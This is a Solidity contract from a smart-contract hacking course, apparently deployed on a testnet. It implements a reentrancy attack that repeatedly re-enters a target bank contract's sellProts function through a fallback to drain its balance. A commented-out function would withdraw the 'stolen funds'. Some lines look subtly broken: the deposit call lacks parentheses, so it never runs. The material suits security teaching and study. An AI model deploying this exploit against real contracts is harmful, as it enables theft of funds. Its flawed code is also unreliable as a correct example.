/**
 *Submitted for verification at testnet.snowtrace.io on 2022-04-26
*/

/// Console Cowboys Smart Contract Hacking Course
/// @author Olie Brown @ficti0n
/// http://cclabs.io 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

interface targetInterface{
    function buyProts() external payable; 
    function sellProts(uint withdrawAmount) external; 
}

contract simpleReentrancyAttack{
    targetInterface bankAddress = targetInterface(0xd9145CCE52D386f254917e481eB44e9943F39138); 
    uint amount = 1 ether; 


    function buyProts() public payable{
        bankAddress.buyProts{value:amount};
    }
    
    function getTargetBalance() public view returns(uint){
        return address(bankAddress).balance; 
    }
    function attack() public payable{
        bankAddress.sellProts(amount); 
    }
    
    //function retrieveStolenFunds() public {
    //    msg.sender.transfer(address(this).balance);
   // }
    
    fallback () external payable{ 
     if (address(bankAddress).balance >= amount){
         bankAddress.sellProts(amount);
     }   
    }
}